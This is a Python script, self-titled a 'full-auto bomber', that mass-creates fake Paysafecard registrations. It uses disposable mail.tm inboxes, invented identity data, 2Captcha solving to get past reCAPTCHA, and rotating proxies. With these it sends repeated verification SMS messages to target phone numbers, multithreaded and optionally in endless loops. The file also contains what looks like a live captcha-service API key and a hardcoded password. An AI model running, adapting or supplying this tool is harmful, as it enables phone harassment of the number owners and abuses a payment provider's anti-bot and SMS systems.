import sys
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
import os
import re
import json
import time
import random
import string
import phonenumbers
from curl_cffi import requests
import itertools
import concurrent.futures
import threading
import builtins

# Pre-mapped configuration for Paysafecard supported countries
COUNTRY_CONFIG = {
    "TN": {"locale": "fr_TN", "currency": "EUR"},
    "US": {"locale": "en_US", "currency": "USD"},
    "GB": {"locale": "en_GB", "currency": "GBP"},
    "DE": {"locale": "de_DE", "currency": "EUR"},
    "FR": {"locale": "fr_FR", "currency": "EUR"},
    "ES": {"locale": "es_ES", "currency": "EUR"},
    "IT": {"locale": "it_IT", "currency": "EUR"},
    "AU": {"locale": "en_AU", "currency": "AUD"},
    "CA": {"locale": "en_CA", "currency": "CAD"},
    "AT": {"locale": "de_AT", "currency": "EUR"},
    "CH": {"locale": "de_CH", "currency": "CHF"},
    "PL": {"locale": "pl_PL", "currency": "PLN"},
    "SE": {"locale": "sv_SE", "currency": "SEK"},
    "NL": {"locale": "nl_NL", "currency": "EUR"},
    "BE": {"locale": "fr_BE", "currency": "EUR"},
    "PT": {"locale": "pt_PT", "currency": "EUR"},
    "GR": {"locale": "el_GR", "currency": "EUR"},
    "IN": {"locale": "en_US", "currency": "USD"} # Paysafe rejects en_IN. Using en_US to bypass number length limits!
}

def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def get_temp_email():
    domains_res = requests.get("https://api.mail.tm/domains").json()
    domain = domains_res['hydra:member'][0]['domain']
    
    username = generate_random_string()
    password = generate_random_string(12)
    email = f"{username}@{domain}"
    
    account_data = {
        "address": email,
        "password": password
    }
    
    while True:
        res = requests.post("https://api.mail.tm/accounts", json=account_data)
        if res.status_code == 429:
            time.sleep(5)
            continue
        elif res.status_code in [200, 201]:
            break
        else:
            raise Exception(f"Failed to create email: {res.text}")
            
    token_data = {
        "address": email,
        "password": password
    }
    
    while True:
        token_res = requests.post("https://api.mail.tm/token", json=token_data)
        if token_res.status_code == 429:
            time.sleep(5)
            continue
        elif token_res.status_code == 200:
            token = token_res.json()['token']
            break
        else:
            raise Exception(f"Failed to get token: {token_res.text}")
            
    return email, password, token

def wait_for_paysafe_email(mail_token, timeout=120):
    headers = {"Authorization": f"Bearer {mail_token}"}
    start_time = time.time()
    print("[*] Waiting for Verification Email on mail.tm (Polling)", end="", flush=True)
    
    seen_ids = set()
    while time.time() - start_time < timeout:
        try:
            res = requests.get("https://api.mail.tm/messages", headers=headers)
            if res.status_code == 429:
                time.sleep(2)
                continue
                
            messages = res.json().get("hydra:member", [])
            for msg in messages:
                msg_id = msg["id"]
                if msg_id in seen_ids:
                    continue
                seen_ids.add(msg_id)
                
                subject = msg.get("subject", "").lower()
                if "paysafecard" in subject or "messagerie" in subject:
                    print(f"\n[+] Found Email: {msg.get('subject')}")
                    msg_res = requests.get(f"https://api.mail.tm/messages/{msg_id}", headers=headers)
                    text = msg_res.json().get("text", "")
                    html_data = msg_res.json().get("html", [])
                    if isinstance(html_data, list):
                        html = " ".join(html_data)
                    else:
                        html = str(html_data)
                        
                    content = str(text) + " " + html
                    
                    urls = re.findall(r'(https?://[^\s\"\'\>]+)', content)
                    for url in urls:
                        url = url.rstrip('">].)')
                        if 'paysafecard.com' in url and not any(ext in url.lower() for ext in ['.png', '.jpg', '.jpeg', '.gif', 'image']):
                            if 'registration' in url or 'verify' in url.lower() or 'confirm' in url.lower():
                                return url
                    print("[-] Found email but no valid link inside. Checking others...")
        except Exception as e:
            print(f"\n[-] Email parsing error: {e}")
            
        print(".", end="", flush=True)
        time.sleep(3)
        
    print("\n[-] Timeout waiting for email.")
    return None

def fetch_captcha_token():
    TWOCAPTCHA_API_KEY = "98730eee20f06e46fb9c9501c0f63de3" # Put your key here!
    print("[*] Requesting reCAPTCHA v3 token from 2Captcha API...")
    create_task_url = "https://api.2captcha.com/createTask"
    
    task_payload = {
        "type": "RecaptchaV2TaskProxyless",
        "websiteURL": "https://registration.paysafecard.com/customer-registration/",
        "websiteKey": "6LcadcMZAAAAAOiDeeYXcj3ML547636Rlbw6Mc_4",
        "isInvisible": True
    }
    
    payload = {
        "clientKey": TWOCAPTCHA_API_KEY,
        "task": task_payload
    }
    
    try:
        res = requests.post(create_task_url, json=payload).json()
        if res.get("errorId") != 0:
            print(f"[-] 2Captcha Error: {res}")
            return ""
            
        task_id = res.get("taskId")
        print(f"[*] Task created (ID: {task_id}). Waiting for 2Captcha solution...")
        
        get_result_url = "https://api.2captcha.com/getTaskResult"
        for _ in range(60):
            time.sleep(3)
            result_res = requests.post(get_result_url, json={"clientKey": TWOCAPTCHA_API_KEY, "taskId": task_id}).json()
            status = result_res.get("status")
            
            if status == "ready":
                token = result_res.get("solution", {}).get("gRecaptchaResponse")
                print(f"[+] 2Captcha Token Grabbed: {str(token)[:40]}...")
                return token
            elif status == "processing":
                continue
            else:
                print(f"[-] 2Captcha Status Error: {result_res}")
                return ""
        print("[-] 2Captcha Timeout!")
        return ""
    except Exception as e:
        print(f"[-] 2Captcha API Request Failed: {e}")
        return ""

def process_registration(target_phone, proxy_string=None, resend_count=2, emoji="[*]"):
    def print(*args, **kwargs):
        builtins.print(f"{emoji}", *args, **kwargs)

    if proxy_string:
        print("Using Proxy: " + proxy_string.split(':')[0] + " (Auth Hidden)")
    
    print("[*] Generating fast temp email...")
    try:
        email, password, mail_token = get_temp_email()
        print(f"[+] Temp Email: {email}")
    except Exception as e:
        print(f"[-] Email Error: {e}")
        return

    session = requests.Session(impersonate="chrome")
    
    if proxy_string:
        parts = proxy_string.split(':')
        if len(parts) == 4:
            http_proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            session.proxies = {"http": http_proxy, "https": http_proxy}
        else:
            session.proxies = {"http": f"http://{proxy_string}", "https": f"http://{proxy_string}"}

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.6',
        'content-type': 'application/json',
        'origin': 'https://registration.paysafecard.com',
        'referer': 'https://registration.paysafecard.com/customer-registration/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
    }

    try:
        # 1 Millisecond Country Detection
        formatted_target = target_phone if target_phone.startswith("+") else "+" + target_phone
        parsed_number = phonenumbers.parse(formatted_target, None)
        region_code = phonenumbers.region_code_for_number(parsed_number)
        
        # Look up locale and currency from config, default to US if not found
        config = COUNTRY_CONFIG.get(region_code, {"locale": "en_US", "currency": "USD"})
        reg_locale = config["locale"]
        reg_currency = config["currency"]
        
        print(f"[*] Detected Country: {region_code} -> Locale: {reg_locale}, Currency: {reg_currency}")
        
        print("[*] API -> Step 0: Initializing Session (Fetching Cookies)")
        session.get("https://registration.paysafecard.com/customer-registration/", headers=headers)
        
        print(f"[*] API -> Step 1: Starting Session (Country: {region_code})")
        start_payload = {"product":"mypins","locale":reg_locale,"currency":reg_currency,"additionalParameters":{}}
        res = session.post("https://registration.paysafecard.com/customer-registration/api/v1/start", json=start_payload, headers=headers)
        
        if res.status_code != 200:
            print(f"[-] Failed /start API. Code: {res.status_code}")
            return
            
        ref_id = res.json().get("registrationReference")
        print(f"[+] Registration Reference ID: {ref_id}")

        captcha_token_1 = fetch_captcha_token()

        print("[*] API -> Step 2: Submitting Email, Password & 1st Captcha")
        if captcha_token_1:
            headers['x-captcha'] = captcha_token_1
            
        login_payload = {
            "registrationReference": ref_id,
            "stepName": "login_details",
            "stepPayload": {
                "password": "Vishupal777@@",
                "newsletters": True,
                "pushNotificationOffers": True,
                "inAccountOffers": True,
                "digitalMediaOffers": True,
                "partnerOffers": True,
                "email": email,
                "completeWorkflow": True
            }
        }
        
        res = session.post("https://registration.paysafecard.com/customer-registration/api/v1/steps/execute", json=login_payload, headers=headers)
        if res.status_code != 200:
            print(f"[-] Failed /execute API. Code: {res.status_code}")
            print(res.text)
            return
        print(f"[+] Login Details Accepted! (Status: {res.status_code})")
        
        if 'x-captcha' in headers:
            del headers['x-captcha']
            
        verify_link = wait_for_paysafe_email(mail_token)
        if verify_link:
            print(f"[+] Verification Link Extracted: {verify_link}")
            
            # Extract code from URL
            # Example URL: ...?product=psc&registrationReference=...&code=2FqKWJWCwnPnlenu
            import urllib.parse
            parsed_url = urllib.parse.urlparse(verify_link)
            qs = urllib.parse.parse_qs(parsed_url.query)
            verify_code = qs.get("code", [None])[0]
            
            if verify_code:
                print(f"[*] API -> Verifying Email using code: {verify_code}")
                verify_payload = {
                    "registrationReference": ref_id,
                    "stepName": "verify_email_address",
                    "stepPayload": {
                        "verificationCode": verify_code
                    }
                }
                verify_res = session.post("https://registration.paysafecard.com/customer-registration/api/v1/steps/execute", json=verify_payload, headers=headers)
                if verify_res.status_code == 200:
                    print("[+] Email Verified Successfully via API!")
                else:
                    print(f"[-] API Verification failed: {verify_res.status_code}")
                    return
            else:
                print("[-] Could not extract 'code' from verify link.")
                return
        else:
            return

        print("[*] API -> Step 2.5: Submitting Personal Details")
        personal_payload = {
            "registrationReference": ref_id,
            "stepName": "personal_details",
            "stepPayload": {
                "firstName": "lola",
                "lastName": "lili",
                "dateOfBirth": "1940-01-01"
            }
        }
        res = session.post("https://registration.paysafecard.com/customer-registration/api/v1/steps/execute", json=personal_payload, headers=headers)
        if res.status_code != 200:
            print(f"[-] Failed Personal Details Submission. Code: {res.status_code}")
            return
        print(f"[+] Personal Details Accepted! (Status: {res.status_code})")

        print("[*] API -> Step 3: Submitting Address Details")
        address_payload = {
            "registrationReference": ref_id,
            "stepName": "address_data",
            "stepPayload": {
                "street": "lllooo",
                "houseNumber": "lolo",
                "zipCode": "2002",
                "city": "chincho"
            }
        }
        res = session.post("https://registration.paysafecard.com/customer-registration/api/v1/steps/execute", json=address_payload, headers=headers)
        if res.status_code != 200:
            print(f"[-] Failed Address Submission. Code: {res.status_code}")
            try:
                print(f"[*] Server Response: {res.text}")
            except:
                pass
            return
        print(f"[+] Address Data Accepted! (Status: {res.status_code})")

        captcha_token_2 = fetch_captcha_token()

        print(f"[*] API -> Step 4: Submitting Mobile Number to Fire SMS to {target_phone}!")
        if captcha_token_2:
            headers['x-captcha'] = captcha_token_2
            
        # Universal country code and phone number parsing
        formatted_target = target_phone if target_phone.startswith("+") else "+" + target_phone
        try:
            parsed_number = phonenumbers.parse(formatted_target, None)
            cc = "+" + str(parsed_number.country_code)
            ph = str(parsed_number.national_number)
        except Exception as e:
            print(f"[-] Phone number parsing failed for {target_phone}: {e}")
            print("[*] Falling back to default Tunisian code +216...")
            cc = "+216"
            ph = target_phone
            
        mobile_payload = {
            "registrationReference": ref_id,
            "stepName": "mobile_number",
            "stepPayload": {
                "phoneNumber": ph,
                "countryCallingCode": cc,
                "mobileNumberStepInitiated": True
            }
        }
        res = session.post("https://registration.paysafecard.com/customer-registration/api/v1/steps/execute", json=mobile_payload, headers=headers)
        if res.status_code == 200:
            print(f"[*] BINGO! SMS 1 FIRED SUCCESSFULLY TO {target_phone}!")
            
            # Extract cooldown time from response
            cool_off = 30
            try:
                res_data = res.json()
                next_steps = res_data.get("nextSteps", [])
                for step in next_steps:
                    if step.get("stepName") == "verify_mobile_number":
                        cool_off = int(step.get("stepMeta", {}).get("resendButtonCoolOff", 30))
                        attempts_left = step.get("stepMeta", {}).get("resendSmsCodeLeft", "?")
                        print(f"[+] API Proof -> SMS Accepted! (HTTP {res.status_code}) | Attempts Left: {attempts_left} | Next Cooldown: {cool_off}s")
                        break
            except Exception as e:
                pass
                
            # Perform resends (total 1 + resend_count SMS per captcha/proxy)
            for i in range(resend_count):
                wait_time = cool_off + 1
                print(f"[*] Waiting {wait_time} seconds before Resend {i+1}...")
                time.sleep(wait_time)
                
                print(f"[*] API -> Step 5.{i+1}: Resending SMS to {target_phone}!")
                resend_payload = {
                    "registrationReference": ref_id,
                    "stepName": "verify_mobile_number",
                    "stepPayload": {
                        "resendSmsCode": True
                    }
                }
                # Remove captcha from header for resend just in case, though usually harmless
                if 'x-captcha' in headers:
                    del headers['x-captcha']
                    
                resend_res = session.post("https://registration.paysafecard.com/customer-registration/api/v1/steps/execute", json=resend_payload, headers=headers)
                if resend_res.status_code == 200:
                    print(f"[*] BINGO! RESEND SMS {i+1} FIRED SUCCESSFULLY!")
                    try:
                        # Update cool_off for next iteration if the server changed it
                        next_steps = resend_res.json().get("nextSteps", [])
                        for step in next_steps:
                            if step.get("stepName") == "verify_mobile_number":
                                cool_off = int(step.get("stepMeta", {}).get("resendButtonCoolOff", 30))
                                attempts_left = step.get("stepMeta", {}).get("resendSmsCodeLeft", "?")
                                print(f"[+] API Proof -> Resend Accepted! (HTTP {resend_res.status_code}) | Attempts Left: {attempts_left} | Next Cooldown: {cool_off}s")
                                break
                    except:
                        pass
                else:
                    print(f"[-] Failed Resend. (HTTP {resend_res.status_code})")
                    try:
                        err_msg = resend_res.json()[0].get("message", "Unknown Error")
                        print(f"[-] Error Reason: {err_msg}")
                    except:
                        print(resend_res.text)
                    break
        else:
            print(f"[-] Failed Mobile Submission. (HTTP {res.status_code})")
            try:
                err_msg = res.json()[0].get("message", "Unknown Error")
                print(f"[-] Error Reason: {err_msg}")
            except:
                print(res.text)

    except Exception as e:
        print(f"[-] Process Failed: {e}")

if __name__ == "__main__":
    print("\n" + "="*50)
    print("PAYSAFECARD FULL-AUTO BOMBER (HTTP MODE)")
    print("="*50 + "\n")

    proxy_file = "proxies.txt"
    proxies = []
    if os.path.exists(proxy_file):
        with open(proxy_file, "r") as pf:
            proxies = [line.strip() for line in pf if line.strip()]
            
    number_file = "numbers.txt"
    numbers = []
    if os.path.exists(number_file):
        with open(number_file, "r") as nf:
            numbers = [line.strip() for line in nf if line.strip()]
            
    if not numbers:
        numbers = ["20111561"]
            
    config_file = "config.json"
    resend_limit = 2
    global_loops = 2
    max_threads = 2
    if os.path.exists(config_file):
        with open(config_file, "r") as cf:
            try:
                config_data = json.load(cf)
                resend_limit = config_data.get("resend_count", 2)
                global_loops = config_data.get("loop_count", 2)
                max_threads = config_data.get("threads", 2)
            except Exception as e:
                print("[-] Failed to parse config.json, using defaults.")
                
    print(f"[*] Loaded {len(proxies)} proxies and {len(numbers)} target numbers.")
    print(f"[*] Config: {resend_limit} Resends | {global_loops if global_loops > 0 else 'Infinite'} Global Loops | {max_threads} Threads")
    print("[*] Bomber started in round-robin multithreaded loop (CTRL+C to stop)...")
    
    if proxies:
        random.shuffle(proxies)
    proxy_cycle = itertools.cycle(proxies) if proxies else None

    # Emojis for threads
    thread_emojis = ["🟢", "🔴", "🔵", "🟡", "🟣", "🟠"]

    current_loop = 1
    while global_loops <= 0 or current_loop <= global_loops:
        print(f"\n==================================================")
        print(f"       GLOBAL ROUND-ROBIN LOOP #{current_loop} STARTING       ")
        print(f"==================================================")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            
            # Create a task list that ensures max_threads are spawned even for a single number
            tasks = []
            for number in numbers:
                # Add it max_threads times so it hits concurrently
                for _ in range(max_threads):
                    tasks.append(number)
                    
            for idx, number in enumerate(tasks):
                current_proxy = next(proxy_cycle) if proxy_cycle else None
                
                # Assign an emoji prefix for visual tracking based on thread ID
                emoji_icon = thread_emojis[(idx % max_threads) % len(thread_emojis)]
                emoji = f"{emoji_icon} [T{idx % max_threads + 1}]"
                
                futures.append(
                    executor.submit(process_registration, number, current_proxy, resend_limit, emoji)
                )
                time.sleep(1.5) # Slight stagger so threads don't hit APIs at the exact same millisecond
            
            # Wait for all numbers in this loop to finish before moving to the next global loop
            concurrent.futures.wait(futures)
            
            # Check for any crashes in the threads
            for f in futures:
                try:
                    f.result()
                except Exception as e:
                    builtins.print(f"[-] Thread crashed: {e}")
            
        print(f"\n[*] Loop #{current_loop} completed. Cooldown for 5 seconds before next loop...")
        time.sleep(5)
        current_loop += 1
        
    print("\n[*] All loops finished! Bomber task complete.")
